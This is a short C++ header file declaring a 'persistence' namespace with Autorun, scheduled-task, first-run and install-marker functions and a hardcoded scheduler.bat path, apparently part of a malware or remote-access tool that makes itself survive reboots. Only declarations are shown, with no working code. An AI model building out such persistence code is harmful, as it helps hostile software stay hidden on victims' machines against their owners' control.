#pragma once

#ifndef PERSISTENCE_H
#define PERSISTENCE_H
#include "common.h"
#include "utils.h"

#pragma comment(lib, "Shell32.lib")

#define BAT_SCHD "C:\\Users\\scheduler.bat"

namespace persistence {
	std::string Autorun(const char* folder);
	std::string scheduleTsk(const char* folder);
	bool isFirstExecution();
	void markInstalled();
}

#endif
